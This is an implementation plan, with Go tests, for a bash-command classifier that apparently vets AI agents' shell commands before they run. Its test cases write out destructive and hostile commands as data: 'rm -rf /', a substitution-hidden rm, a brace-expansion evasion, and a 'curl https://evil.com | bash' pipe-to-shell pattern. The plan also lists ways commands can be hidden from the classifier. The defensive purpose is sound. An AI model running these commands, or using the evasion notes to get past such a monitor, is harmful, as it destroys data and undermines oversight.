# Stargate Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build stargate — a bash command classifier that parses shell commands into ASTs, evaluates them against configurable rules with contextual trust scoping, and escalates ambiguous commands to an LLM for review.

**Architecture:** Persistent HTTP server (`stargate serve`) on localhost classifies commands via `POST /classify`. Agent-specific adapters (`stargate hook`) translate between agent hook protocols and the classification API. The pipeline is: parse → walk AST → evaluate rules (RED/GREEN/YELLOW) → resolve scopes → query precedent corpus → LLM review → respond.

**Tech Stack:** Go, `mvdan.cc/sh/v3` (shell parser), `github.com/BurntSushi/toml`, `modernc.org/sqlite`, `github.com/anthropics/anthropic-sdk-go`, `go.opentelemetry.io/otel`, `net/http` (stdlib).

**Spec:** `docs/superpowers/specs/2026-04-06-stargate-design.md`

---

## M0: Skeleton

Goal: CLI structure, config loader, HTTP server with `/health`. No classification logic.

### Task 0.1: Initialize Go module and dependencies

**Files:**
- Create: `go.mod`
- Create: `go.sum`

- [ ] **Step 1: Initialize the Go module**

```bash
cd /Users/derek/src/stargate
go mod init github.com/limbic-systems/stargate
```

- [ ] **Step 2: Add core dependencies**

```bash
go get mvdan.cc/sh/v3@latest
go get github.com/BurntSushi/toml@latest
go get modernc.org/sqlite@latest
go get github.com/anthropics/anthropic-sdk-go@latest
go get go.opentelemetry.io/otel@latest
go get go.opentelemetry.io/otel/sdk@latest
```

- [ ] **Step 3: Commit**

```bash
git add go.mod go.sum
git commit -m "chore: initialize go module with dependencies"
```

### Task 0.2: Config types and TOML loader

**Files:**
- Create: `internal/config/config.go`
- Create: `internal/config/config_test.go`
- Create: `stargate.toml`

- [ ] **Step 1: Write failing test for config loading**

Create `internal/config/config_test.go`:

```go
package config_test

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/limbic-systems/stargate/internal/config"
)

func TestLoadMinimalConfig(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "stargate.toml")
	os.WriteFile(path, []byte(`
[server]
listen = "127.0.0.1:9099"
timeout = "10s"

[parser]
dialect = "bash"

[classifier]
default_decision = "yellow"
max_ast_depth = 64
max_command_length = 65536
`), 0644)

	cfg, err := config.Load(path)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if cfg.Server.Listen != "127.0.0.1:9099" {
		t.Errorf("listen = %q, want %q", cfg.Server.Listen, "127.0.0.1:9099")
	}
	if cfg.Classifier.DefaultDecision != "yellow" {
		t.Errorf("default_decision = %q, want %q", cfg.Classifier.DefaultDecision, "yellow")
	}
}

func TestLoadConfigValidation(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "stargate.toml")
	os.WriteFile(path, []byte(`
[classifier]
default_decision = "invalid"
`), 0644)

	_, err := config.Load(path)
	if err == nil {
		t.Fatal("expected validation error for invalid default_decision")
	}
}

func TestLoadConfigMissingFile(t *testing.T) {
	_, err := config.Load("/nonexistent/stargate.toml")
	if err == nil {
		t.Fatal("expected error for missing file")
	}
}
```

- [ ] **Step 2: Run test to verify it fails**

```bash
go test ./internal/config/ -v
```
Expected: FAIL — package doesn't exist yet.

- [ ] **Step 3: Implement config types and loader**

Create `internal/config/config.go` with all the config structs matching the TOML spec (§5): `Config`, `ServerConfig`, `ParserConfig`, `ClassifierConfig`, `ScopesConfig`, `RuleConfig`, `LLMConfig`, `ScrubbingConfig`, `CorpusConfig`, `TelemetryConfig`, `LogConfig`. Implement `Load(path string) (*Config, error)` that reads the TOML file, unmarshals, and validates required fields. Implement `Validate() error` on Config.

Key types:
- `ServerConfig`: `Listen string`, `Timeout Duration`
- `ParserConfig`: `Dialect string`, `ResolveAliases bool`
- `ClassifierConfig`: `DefaultDecision string`, `UnresolvableExpansion string`, `MaxASTDepth int`, `MaxCommandLength int`
- `RulesConfig`: `Red []Rule`, `Green []Rule`, `Yellow []Rule`
- `Rule`: `Command string`, `Commands []string`, `Subcommands []string`, `Flags []string`, `Args []string`, `Pattern string`, `Scope string`, `Context string`, `Resolve *ResolveConfig`, `LLMReview *bool`, `Reason string`
- `ResolveConfig`: `Resolver string`, `Scope string`
- `ScopesConfig`: `map[string][]string`
- `LLMConfig`: `Provider string`, `Model string`, `MaxTokens int`, `Temperature float64`, `AllowFileRetrieval bool`, `MaxFileSize int`, `AllowedPaths []string`, `DeniedPaths []string`, `SystemPrompt string`, `MaxResponseReasoningLength int`
- `ScrubbingConfig`: `ExtraPatterns []string`
- `CorpusConfig`: `Enabled bool`, `Path string`, `MaxPrecedents int`, `MinSimilarity float64`, `ExactHitMode string`, `MaxAge string`, `MaxEntries int`, `PruneInterval string`, `StoreDecisions string`, `StoreReasoning bool`, `StoreRawCommand bool`, `StoreUserApprovals bool`, `MaxPrecedentsPerDecision int`

Validation rules:
- `DefaultDecision` must be one of `"red"`, `"yellow"`, `"green"`
- `Listen` must not be empty
- `Provider` defaults to `"anthropic"` if empty
- `ExactHitMode` must be `"precedent"` or `"auto_decide"`

- [ ] **Step 4: Run tests**

```bash
go test ./internal/config/ -v
```
Expected: PASS

- [ ] **Step 5: Create example stargate.toml**

Copy the full TOML config from the spec §5 into `stargate.toml` at the project root. This serves as both the default config and documentation.

- [ ] **Step 6: Commit**

```bash
git add internal/config/ stargate.toml
git commit -m "feat(config): add TOML config types and loader with validation"
```

### Task 0.3: CLI entry point with subcommand structure

**Files:**
- Create: `cmd/stargate/main.go`

- [ ] **Step 1: Implement CLI entry point**

Create `cmd/stargate/main.go` using the `flag` stdlib package (no external CLI framework). Implement subcommand dispatch for: `serve`, `hook`, `test`, `config`, `corpus`. Global flags: `-c`/`--config`, `-v`/`--verbose`, `--version`. Config resolution order: `--config` flag → `STARGATE_CONFIG` env → `$CLAUDE_PROJECT_DIR/.stargate.toml` → `~/.config/stargate/stargate.toml`.

For now, each subcommand prints "not implemented" and exits. Only `serve` and `config validate` will be wired up in this milestone.

- [ ] **Step 1.5: Write tests for config resolution and unknown subcommands**

Create `cmd/stargate/main_test.go`:

```go
func TestConfigResolutionOrder(t *testing.T) {
	// --config flag takes precedence over env var
	// env var (STARGATE_CONFIG) takes precedence over default paths
	// Default paths: $CLAUDE_PROJECT_DIR/.stargate.toml → ~/.config/stargate/stargate.toml
}

func TestUnknownSubcommandPrintsHelpAndExitsNonZero(t *testing.T) {
	// Running `stargate bogus` should print help to stderr and exit non-zero
}
```

Test that `--config /path/to/config.toml` overrides `STARGATE_CONFIG` env var, and that `STARGATE_CONFIG` overrides the default search paths. Test that an unknown subcommand (e.g., `stargate bogus`) prints help text and exits with a non-zero status.

- [ ] **Step 2: Verify it builds and runs**

```bash
go build -o stargate ./cmd/stargate/
./stargate --version
./stargate --help
./stargate serve --help
```

- [ ] **Step 3: Run tests**

```bash
go test ./cmd/stargate/ -v
```

- [ ] **Step 4: Commit**

```bash
git add cmd/
git commit -m "feat: add CLI entry point with subcommand dispatch"
```

### Task 0.4: HTTP server with /health endpoint

**Files:**
- Create: `internal/server/server.go`
- Create: `internal/server/server_test.go`

- [ ] **Step 1: Write failing test for /health**

Create `internal/server/server_test.go`:

```go
package server_test

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"testing"

	"github.com/limbic-systems/stargate/internal/config"
	"github.com/limbic-systems/stargate/internal/server"
)

func TestHealthEndpoint(t *testing.T) {
	cfg := &config.Config{
		Server: config.ServerConfig{Listen: "127.0.0.1:9099"},
	}
	srv := server.New(cfg)

	req := httptest.NewRequest("GET", "/health", nil)
	w := httptest.NewRecorder()
	srv.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("status = %d, want %d", w.Code, http.StatusOK)
	}

	var body map[string]interface{}
	if err := json.NewDecoder(w.Body).Decode(&body); err != nil {
		t.Fatalf("invalid JSON: %v", err)
	}
	if body["status"] != "ok" {
		t.Errorf("status = %v, want ok", body["status"])
	}
}
```

- [ ] **Step 2: Run test to verify it fails**

```bash
go test ./internal/server/ -v
```

- [ ] **Step 3: Implement server**

Create `internal/server/server.go`: a `Server` struct wrapping `http.ServeMux`, holding a reference to `*config.Config` via `atomic.Pointer`. Register `GET /health` handler returning JSON with `status`, `version`, `uptime_seconds`, `config_loaded_at`, and rule counts. Implement `ServeHTTP` to delegate to the mux. Add stub handlers for `POST /classify`, `POST /feedback`, `POST /reload`, `POST /test` that return 501 Not Implemented.

- [ ] **Step 4: Run tests**

```bash
go test ./internal/server/ -v
```
Expected: PASS

- [ ] **Step 5: Wire server into `stargate serve` subcommand**

Update `cmd/stargate/main.go` to load config, create server, and `ListenAndServe` on the configured address. Support `-l`/`--listen` flag to override the config listen address. Add signal handling for SIGINT/SIGTERM with graceful 5s shutdown.

- [ ] **Step 6: Manual smoke test**

```bash
go build -o stargate ./cmd/stargate/
./stargate serve &
curl http://127.0.0.1:9099/health | jq .
kill %1
```
Expected: JSON response with `"status": "ok"`.

- [ ] **Step 7: Commit**

```bash
git add internal/server/ cmd/
git commit -m "feat(server): add HTTP server with /health endpoint and graceful shutdown"
```

### Task 0.5: `stargate config validate` subcommand

**Files:**
- Modify: `cmd/stargate/main.go`

- [ ] **Step 1: Implement `config validate`**

Wire the `config validate` subcommand to load and validate the config, printing success/failure and rule counts.

- [ ] **Step 2: Write tests for config validate**

Create table-driven tests in `cmd/stargate/main_test.go` (or `internal/config/validate_test.go`):

```go
func TestConfigValidate(t *testing.T) {
	tests := []struct {
		name     string
		toml     string
		wantExit int
		wantErr  string
	}{
		{"valid config", validTOML, 0, ""},
		{"invalid default_decision", invalidDecisionTOML, 1, "default_decision"},
		{"missing file", "", 1, "no such file"},
	}
	// ... run each case, verify exit code and error message substring
}
```

Test cases: valid config exits 0, invalid config (e.g., bad `default_decision`) exits 1 with error message, missing file exits 1.

- [ ] **Step 3: Run tests**

```bash
go test ./cmd/stargate/ -v -run TestConfigValidate
```

- [ ] **Step 4: Commit**

```bash
git add cmd/
git commit -m "feat(config): add config validate subcommand"
```

---

## M1: Parser + Walker

Goal: Parse bash commands into ASTs and extract structured `CommandInfo` from every command invocation.

> **M1 Retrospective (post-implementation):** The original plan treated the walker as
> a straightforward AST traversal. PR review revealed it's the most complex component
> — 84 review threads across 20 rounds produced 29 fix commits. Three areas were
> underspecified and drove most of the review tail:
>
> 1. **Redirect ownership** — 6 rounds. The plan said "extract redirects" but didn't
>    specify which command owns a redirect on pipelines, compound statements, or
>    nested structures. See spec §7.2.3 for the rules that emerged.
>
> 2. **AST nesting paths** — commands can hide in 10+ locations (ParamExp defaults,
>    ArithmExp, ArithmCmd, LetClause, CStyleLoop, CaseClause patterns, redirect
>    operands, DblQuoted, ProcSubst). The plan only tested `$()` and subshells.
>    See spec §7.2.2 for the complete list.
>
> 3. **Prefix stripping edge cases** — unknown flags, wrapper exhaustion, non-literal
>    values, `command -v` lookup mode, env-assign validation (POSIX identifiers,
>    quoted values). The plan treated this as a simple map lookup. See spec §7.2.4.
>
> **For future milestones:** When a component touches shell semantics or security
> classification, add a design verification task that maps every possible input
> path before writing implementation code. Test matrices should enumerate edge
> cases, not just happy paths.

### Task 1.1: Core types (CommandInfo, CommandContext)

**Files:**
- Create: `internal/rules/types.go`

- [ ] **Step 1: Define types**

Create `internal/rules/types.go` with the types from spec §7.2:

```go
package rules

import "mvdan.cc/sh/v3/syntax" // shell AST types

type CommandInfo struct {
	Name       string
	Args       []string
	Flags      []string
	Subcommand string
	Redirects  []RedirectInfo
	Env        map[string]string
	RawNode    *syntax.CallExpr  // Pointer back to AST node
	Context    CommandContext
}

type RedirectInfo struct {
	Op   string // ">", ">>", "<", "2>", "&>", etc.
	File string
}

type CommandContext struct {
	PipelinePosition int    // 0=not in pipe, 1=source, 2+=sink
	SubshellDepth    int
	InSubstitution   bool
	InCondition      bool
	InFunction       string
	ParentOperator   string // "&&", "||", ";", "|"
}
```

- [ ] **Step 2: Commit**

```bash
git add internal/rules/types.go
git commit -m "feat(rules): add CommandInfo and CommandContext types"
```

### Task 1.2: Shell parser wrapper

**Files:**
- Create: `internal/parser/parser.go`
- Create: `internal/parser/parser_test.go`

- [ ] **Step 1: Write failing test for basic parsing**

Test that a simple command parses without error and that an invalid command returns a parse error:

```go
package parser_test

import (
	"testing"

	"github.com/limbic-systems/stargate/internal/parser"
)

func TestParseSimpleCommand(t *testing.T) {
	result, err := parser.Parse("git status", "bash")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result == nil {
		t.Fatal("expected non-nil AST")
	}
}

func TestParseInvalidCommand(t *testing.T) {
	_, err := parser.Parse("echo 'unterminated", "bash")
	if err == nil {
		t.Fatal("expected parse error for unterminated quote")
	}
}
```

- [ ] **Step 2: Run test to verify it fails**

```bash
go test ./internal/parser/ -v
```

- [ ] **Step 3: Implement parser**

Create `internal/parser/parser.go`: `Parse(command string, dialect string) (*syntax.File, error)` that creates a `syntax.NewParser()` with the appropriate `syntax.Variant` (bash/posix/mksh) and calls `parser.Parse(strings.NewReader(command), "")`.

- [ ] **Step 4: Run tests**

```bash
go test ./internal/parser/ -v
```
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add internal/parser/
git commit -m "feat(parser): add shell command parser wrapper around mvdan.cc/sh"
```

### Task 1.3: AST walker — basic command extraction

**Files:**
- Create: `internal/parser/walker.go`
- Modify: `internal/parser/parser_test.go`

- [ ] **Step 1: Write failing tests for command extraction**

Add tests to `parser_test.go`:

```go
func TestWalkSimpleCommand(t *testing.T) {
	cmds, err := parser.ParseAndWalk("git status", "bash")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(cmds) != 1 {
		t.Fatalf("got %d commands, want 1", len(cmds))
	}
	if cmds[0].Name != "git" {
		t.Errorf("name = %q, want %q", cmds[0].Name, "git")
	}
	if cmds[0].Subcommand != "status" {
		t.Errorf("subcommand = %q, want %q", cmds[0].Subcommand, "status")
	}
}

func TestWalkPipeline(t *testing.T) {
	cmds, err := parser.ParseAndWalk("cat file.txt | grep foo | wc -l", "bash")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(cmds) != 3 {
		t.Fatalf("got %d commands, want 3", len(cmds))
	}
	if cmds[0].Context.PipelinePosition != 1 {
		t.Errorf("cat pipeline pos = %d, want 1", cmds[0].Context.PipelinePosition)
	}
	if cmds[2].Context.PipelinePosition != 3 {
		t.Errorf("wc pipeline pos = %d, want 3", cmds[2].Context.PipelinePosition)
	}
}

func TestWalkFlagExtraction(t *testing.T) {
	cmds, err := parser.ParseAndWalk("rm -rf /tmp/build", "bash")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(cmds) != 1 {
		t.Fatalf("got %d commands, want 1", len(cmds))
	}
	// Walker should keep -rf as-is (flag normalization is rule engine's job)
	found := false
	for _, f := range cmds[0].Flags {
		if f == "-rf" {
			found = true
		}
	}
	if !found {
		t.Errorf("flags = %v, want to contain -rf", cmds[0].Flags)
	}
}
```

- [ ] **Step 2: Run tests to verify failure**

```bash
go test ./internal/parser/ -v -run TestWalk
```

- [ ] **Step 3: Implement walker**

Create `internal/parser/walker.go`: `Walk(file *syntax.File) ([]rules.CommandInfo, error)` that uses `syntax.Walk` to traverse the AST. Extract `CallExpr` nodes into `CommandInfo` structs. Track pipeline position via `BinaryCmd` with `|` operator. Track subshell depth via `Subshell` nodes. Track substitution via `CmdSubst` nodes. Handle inline env vars from `CallExpr.Assigns`.

Add `ParseAndWalk(command string, dialect string) ([]rules.CommandInfo, error)` convenience function.

- [ ] **Step 4: Run tests**

```bash
go test ./internal/parser/ -v
```
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add internal/parser/
git commit -m "feat(parser): add AST walker with command, flag, and pipeline extraction"
```

### Task 1.4: Walker — prefix stripping and evasion handling

**Files:**
- Modify: `internal/parser/walker.go`
- Modify: `internal/parser/parser_test.go`

- [ ] **Step 1: Write failing tests for prefix stripping and evasion**

```go
func TestWalkPrefixStripping(t *testing.T) {
	cases := []struct {
		cmd  string
		want string
	}{
		{"command rm -rf /", "rm"},
		{"builtin echo hello", "echo"},
		{"env FOO=bar ls", "ls"},
		{"sudo rm -rf /", "rm"},
		{"doas rm -rf /", "rm"},
		{"nice -n 19 rm -rf /", "rm"},
		{"nohup rm -rf / &", "rm"},
		{"time ls -la", "ls"},
		{"timeout 5 curl http://example.com", "curl"},
	}
	for _, tc := range cases {
		t.Run(tc.cmd, func(t *testing.T) {
			cmds, err := parser.ParseAndWalk(tc.cmd, "bash")
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if len(cmds) == 0 {
				t.Fatal("got 0 commands")
			}
			if cmds[0].Name != tc.want {
				t.Errorf("name = %q, want %q", cmds[0].Name, tc.want)
			}
		})
	}
}

func TestWalkUnresolvableExpansion(t *testing.T) {
	cmds, err := parser.ParseAndWalk("$CMD arg1 arg2", "bash")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(cmds) != 1 {
		t.Fatalf("got %d commands, want 1", len(cmds))
	}
	if cmds[0].Name != "" {
		t.Errorf("expected empty name for unresolvable expansion, got %q", cmds[0].Name)
	}
}

func TestWalkBraceExpansionInCommandPosition(t *testing.T) {
	cmds, err := parser.ParseAndWalk("{rm,-rf,/}", "bash")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(cmds) != 1 {
		t.Fatalf("got %d commands, want 1", len(cmds))
	}
	// Brace patterns should be treated as unresolvable
	if cmds[0].Name != "" {
		t.Errorf("expected empty name for brace expansion, got %q", cmds[0].Name)
	}
}

func TestWalkSubshellAndSubstitution(t *testing.T) {
	cmds, err := parser.ParseAndWalk("echo $(rm -rf /)", "bash")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	// Should find both echo and the rm inside $()
	if len(cmds) < 2 {
		t.Fatalf("got %d commands, want >= 2", len(cmds))
	}
	names := make(map[string]bool)
	for _, c := range cmds {
		names[c.Name] = true
	}
	if !names["rm"] {
		t.Error("expected rm to be extracted from command substitution")
	}
}

func TestWalkQuotingEvasion(t *testing.T) {
	// Parser should resolve quoting — 'rm' and rm produce the same name
	cmds, err := parser.ParseAndWalk("'rm' -rf /", "bash")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if cmds[0].Name != "rm" {
		t.Errorf("name = %q, want %q", cmds[0].Name, "rm")
	}
}
```

- [ ] **Step 2: Run tests to verify failure**

```bash
go test ./internal/parser/ -v -run "TestWalkPrefix|TestWalkUnresolvable|TestWalkBrace|TestWalkSubshell|TestWalkQuoting"
```

- [ ] **Step 3: Implement prefix stripping and evasion detection**

Update `walker.go`:
- Maintain a set of strippable prefixes: `command`, `builtin`, `env`, `sudo`, `doas`, `nice`, `nohup`, `time`, `strace`, `watch`, `timeout`.
- Recursively strip prefixes (up to depth 16). If depth exceeded, mark as unresolvable.
- For `env`, skip its flags (`-i`, `-u`, `-S`, `--`) before extracting the inner command.
- For `nice`, skip `-n <value>` before extracting.
- For `timeout`, skip the duration argument before extracting.
- Detect brace patterns (`{` + `,` in a `Lit` word) in command-name position → mark as unresolvable (empty Name).
- Detect `ParamExp`, `CmdSubst`, `ArithmExp` in command-name position → mark as unresolvable.
- Handle `--` end-of-options: arguments after `--` are never treated as subcommands.

- [ ] **Step 4: Run tests**

```bash
go test ./internal/parser/ -v
```
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add internal/parser/
git commit -m "feat(parser): add prefix stripping, evasion detection, and subshell walking"
```

### Task 1.5: Walker — subcommand extraction with global flag skipping

**Files:**
- Modify: `internal/parser/walker.go`
- Modify: `internal/parser/parser_test.go`

- [ ] **Step 1: Write failing tests**

```go
func TestWalkSubcommandWithGlobalFlags(t *testing.T) {
	cases := []struct {
		cmd        string
		wantSub    string
	}{
		{"git -C /tmp status", "status"},
		{"git --no-pager log", "log"},
		{"docker --context remote ps", "ps"},
		{"git -- status", ""}, // -- terminates options; status is an arg, not subcommand
	}
	for _, tc := range cases {
		t.Run(tc.cmd, func(t *testing.T) {
			cmds, err := parser.ParseAndWalk(tc.cmd, "bash")
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if cmds[0].Subcommand != tc.wantSub {
				t.Errorf("subcommand = %q, want %q", cmds[0].Subcommand, tc.wantSub)
			}
		})
	}
}
```

- [ ] **Step 2: Run tests to verify failure**

- [ ] **Step 3: Implement global flag skipping**

Update `walker.go` subcommand extraction to maintain a per-command map of known global flags with argument counts. For `git`: `-C` (1 arg), `--no-pager` (0 args), `--git-dir` (1 arg). For `docker`: `--context` (1 arg), `-H`/`--host` (1 arg). For `gh`: `--repo`/`-R` (1 arg). For `kubectl`: `--context` (1 arg), `-n`/`--namespace` (1 arg). Skip these flags and their arguments when finding the first positional argument (subcommand). Honor `--` as end-of-options.

- [ ] **Step 4: Run tests**

```bash
go test ./internal/parser/ -v
```

- [ ] **Step 5: Commit**

```bash
git add internal/parser/
git commit -m "feat(parser): subcommand extraction with global flag skipping"
```

---

## M2: Rule Engine

Goal: Load rules from TOML config, match against CommandInfo, and wire `/classify` to return decisions.

> **M2 Retrospective (post-implementation):** 23 commits, 61 review threads,
> ~12 rounds of feedback across Copilot and CodeRabbit. Significantly better
> than M1 (84 threads, 20 rounds) thanks to the pre-implementation design
> verification with the expert panel. The review tail was driven by three
> categories:
>
> 1. **API schema conformance** — 8 threads. The ClassifyResponse shape drifted
>    from the spec during implementation: missing fields (feedback_token, corpus,
>    llm_ms, context enum), wrong types (TotalMs int64 vs float64), omitempty
>    vs null semantics, AST MaxDepth 0-based vs 1-based. **Lesson:** Build the
>    response struct from the spec schema directly, field by field, at the start.
>    Add forward-compatible nil fields for features not yet implemented.
>
> 2. **HTTP handler hardening** — 6 threads. MaxBytesReader, DisallowUnknownFields,
>    trailing-data rejection, error message matching spec, MaxBytesError type
>    detection, TrimSpace centralization. **Lesson:** The /classify handler is a
>    security boundary. Spec the handler behavior (body limits, strict parsing,
>    normalization) as explicitly as the classification pipeline.
>
> 3. **Engine edge cases** — 5 threads. Resolve-gated rules false-GREEN, YELLOW
>    evaluating GREEN-matched commands, unresolvable short-circuit bypassing RED,
>    scope normalization at compile time, context validation. **Lesson:** The
>    pre-implementation panel caught the big design decisions (flag decomposition,
>    scope semantics), but engine implementation details (YELLOW skip logic,
>    resolve stub behavior) still surfaced during code review.
>
> **What the design verification prevented:** The panel review eliminated flag
> normalization ambiguity, scope path-prefix bugs, and pattern evasion concerns
> BEFORE implementation. Without it, those would have added ~20 more threads.
>
> **For future milestones:** Spec the HTTP handler behavior alongside the
> classification pipeline. Build response structs from the spec schema verbatim.
> Use `--paginate` on all GitHub API list queries.

### Task 2.1: Rule compilation and RED matching

**Files:**
- Create: `internal/rules/engine.go`
- Create: `internal/rules/engine_test.go`

- [ ] **Step 1: Write failing tests for RED rule matching**

```go
package rules_test

import (
	"testing"

	"github.com/limbic-systems/stargate/internal/config"
	"github.com/limbic-systems/stargate/internal/rules"
)

func TestRedRuleMatchesRmRf(t *testing.T) {
	cfg := &config.Config{}
	cfg.Rules.Red = []config.Rule{
		{Command: "rm", Flags: []string{"-rf", "-fr"}, Reason: "Recursive force delete"},
	}
	engine, err := rules.NewEngine(cfg)
	if err != nil {
		t.Fatalf("engine creation failed: %v", err)
	}

	cmds := []rules.CommandInfo{
		{Name: "rm", Flags: []string{"-rf"}, Args: []string{"/tmp/build"}},
	}
	result := engine.Evaluate(cmds)
	if result.Decision != "red" {
		t.Errorf("decision = %q, want red", result.Decision)
	}
}

func TestRedRuleNoMatchPlainRm(t *testing.T) {
	cfg := &config.Config{}
	cfg.Rules.Red = []config.Rule{
		{Command: "rm", Flags: []string{"-rf", "-fr"}, Reason: "Recursive force delete"},
	}
	engine, _ := rules.NewEngine(cfg)

	cmds := []rules.CommandInfo{
		{Name: "rm", Flags: []string{}, Args: []string{"file.txt"}},
	}
	result := engine.Evaluate(cmds)
	if result.Decision == "red" {
		t.Error("plain rm should not match RED rule requiring -rf flag")
	}
}
```

- [ ] **Step 2: Run tests**

- [ ] **Step 3: Implement rule engine**

Create `internal/rules/engine.go`:
- `Engine` struct holds compiled rules (RED, GREEN, YELLOW) and config.
- `NewEngine(cfg *config.Config) (*Engine, error)` compiles regex patterns, validates rules.
- `Evaluate(cmds []CommandInfo) *Result` runs the pipeline: RED check → GREEN check → YELLOW check → default.
- `Result` struct: `Decision string`, `Action string`, `Reason string`, `Guidance string`, `Rule *MatchedRule`.
- `MatchedRule`: `Level string`, `Reason string`, `Index int`.
- Rule matching logic per §7.3: command/commands match, subcommands match, flags match (including normalization of combined short flags like `-rf` matching `-r -f`), args glob match, scope path prefix, context match, pattern regex match.
- RED check: any command matches any RED rule → return RED immediately.
- GREEN check: ALL commands must match a GREEN rule → return GREEN. If any fails → continue.
- YELLOW check: first match wins. `llm_review` flag is part of the result.

- [ ] **Step 4: Run tests**

- [ ] **Step 5: Commit**

```bash
git add internal/rules/
git commit -m "feat(rules): add rule engine with RED/GREEN/YELLOW evaluation"
```

### Task 2.2: GREEN and YELLOW matching + flag normalization

**Files:**
- Modify: `internal/rules/engine.go`
- Modify: `internal/rules/engine_test.go`

- [ ] **Step 1: Write tests for GREEN, YELLOW, and flag normalization**

```go
func TestGreenRuleMatchesGitStatus(t *testing.T) {
	cfg := &config.Config{}
	cfg.Rules.Green = []config.Rule{
		{Command: "git", Subcommands: []string{"status", "diff", "log"}, Reason: "Read-only git"},
	}
	engine, _ := rules.NewEngine(cfg)

	cmds := []rules.CommandInfo{
		{Name: "git", Subcommand: "status"},
	}
	result := engine.Evaluate(cmds)
	if result.Decision != "green" {
		t.Errorf("decision = %q, want green", result.Decision)
	}
}

func TestGreenRequiresAllCommandsMatch(t *testing.T) {
	cfg := &config.Config{}
	cfg.Rules.Green = []config.Rule{
		{Commands: []string{"ls", "cat"}, Reason: "Read-only"},
	}
	cfg.Classifier.DefaultDecision = "yellow"
	engine, _ := rules.NewEngine(cfg)

	cmds := []rules.CommandInfo{
		{Name: "ls"},
		{Name: "unknown_cmd"},
	}
	result := engine.Evaluate(cmds)
	if result.Decision == "green" {
		t.Error("should not be GREEN when not all commands match")
	}
}

func TestYellowWithLLMReview(t *testing.T) {
	llmReview := true
	cfg := &config.Config{}
	cfg.Rules.Yellow = []config.Rule{
		{Commands: []string{"curl", "wget"}, LLMReview: &llmReview, Reason: "Network requests"},
	}
	engine, _ := rules.NewEngine(cfg)

	cmds := []rules.CommandInfo{
		{Name: "curl", Flags: []string{"-s"}, Args: []string{"https://example.com"}},
	}
	result := engine.Evaluate(cmds)
	if result.Decision != "yellow" {
		t.Errorf("decision = %q, want yellow", result.Decision)
	}
	if !result.LLMReview {
		t.Error("expected LLMReview = true")
	}
}

func TestFlagNormalization(t *testing.T) {
	cfg := &config.Config{}
	cfg.Rules.Red = []config.Rule{
		{Command: "rm", Flags: []string{"-rf"}, Reason: "Dangerous"},
	}
	engine, _ := rules.NewEngine(cfg)

	// -r -f should match rule for -rf
	cmds := []rules.CommandInfo{
		{Name: "rm", Flags: []string{"-r", "-f"}, Args: []string{"/tmp"}},
	}
	result := engine.Evaluate(cmds)
	if result.Decision != "red" {
		t.Errorf("decision = %q, want red (-r -f should match -rf)", result.Decision)
	}
}

func TestDefaultDecision(t *testing.T) {
	cfg := &config.Config{}
	cfg.Classifier.DefaultDecision = "yellow"
	engine, _ := rules.NewEngine(cfg)

	cmds := []rules.CommandInfo{
		{Name: "some_unknown_command"},
	}
	result := engine.Evaluate(cmds)
	if result.Decision != "yellow" {
		t.Errorf("decision = %q, want yellow (default)", result.Decision)
	}
}

func TestRegexPatternRule(t *testing.T) {
	cfg := &config.Config{}
	cfg.Rules.Red = []config.Rule{
		{Pattern: `(?i)curl\s.*\|\s*(bash|sh)`, Reason: "Pipe to shell"},
	}
	engine, _ := rules.NewEngine(cfg)

	cmds := []rules.CommandInfo{
		{Name: "curl", Args: []string{"https://evil.com"}},
		{Name: "bash"},
	}
	// Pattern rules match against raw command string, not CommandInfo
	result := engine.EvaluateWithRaw(cmds, "curl https://evil.com | bash")
	if result.Decision != "red" {
		t.Errorf("decision = %q, want red", result.Decision)
	}
}
```

- [ ] **Step 2: Run tests**

- [ ] **Step 3: Implement GREEN/YELLOW matching, flag normalization, regex patterns**

Flag normalization: expand combined short flags (e.g., `-rf` → set containing `-r`, `-f`, `-rf`). A rule flag `-rf` matches if the command has either `-rf` combined OR both `-r` and `-f` separately. Add `EvaluateWithRaw(cmds []CommandInfo, raw string) *Result` that also runs regex pattern rules against the raw command string.

- [ ] **Step 4: Run tests**

- [ ] **Step 5: Commit**

```bash
git add internal/rules/
git commit -m "feat(rules): add GREEN/YELLOW matching, flag normalization, and regex patterns"
```

### Task 2.3: Wire /classify endpoint (rule-only, no LLM)

**Files:**
- Create: `internal/classifier/classifier.go`
- Modify: `internal/server/server.go`
- Modify: `internal/server/server_test.go`

- [ ] **Step 1: Write failing test for /classify**

```go
func TestClassifyGreenCommand(t *testing.T) {
	cfg := testConfigWithRules() // helper that loads a minimal config with rules
	srv := server.New(cfg)

	body := `{"command": "git status"}`
	req := httptest.NewRequest("POST", "/classify", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	srv.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200", w.Code)
	}

	var resp map[string]interface{}
	json.NewDecoder(w.Body).Decode(&resp)
	if resp["action"] != "allow" {
		t.Errorf("action = %v, want allow", resp["action"])
	}
}

func TestClassifyRedCommand(t *testing.T) {
	cfg := testConfigWithRules()
	srv := server.New(cfg)

	body := `{"command": "rm -rf /"}`
	req := httptest.NewRequest("POST", "/classify", strings.NewReader(body))
